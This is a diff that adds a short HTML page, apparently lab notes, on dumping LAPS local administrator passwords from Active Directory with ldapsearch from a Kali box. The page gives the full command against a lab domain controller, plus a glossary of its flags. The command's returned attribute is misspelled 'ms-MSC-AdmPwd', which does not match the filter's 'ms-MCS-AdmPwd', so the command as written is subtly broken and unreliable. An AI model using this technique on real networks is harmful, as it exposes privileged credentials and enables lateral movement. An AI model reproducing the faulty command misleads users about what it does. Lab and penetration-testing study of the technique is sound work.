@@ -1,0 +1,15 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>LDAPSearch</title>
+</head><body>LDAP Search: As mentioned in the <a href="https://room362.com/post/2017/dump-laps-passwords-with-ldapsearch/">blog post of Rob ‘mubix’ Fuller</a>, we will use ldapsearch from our very own kali linux box to dump ‘ms-MCS-AdmPwd ‘attribute.<br/>
+<br/>
+ldapsearch -x -h 10.10.10.254 -D &lt;&lt;username&gt;&gt; -w &lt;&lt;password&gt;&gt; -b "dc=AJLAB,dc=COM" "(ms-MCS-AdmPwd=*)" ms-MSC-AdmPwd<br/>
+<br/>
+-x: Simple Authentication <br/>
+-h: LDAP URI<br/>
+-D: use the Distinguished Name<br/>
+-w: Use the password for auth<br/>
+-b: search base<br/>
+</body></html>
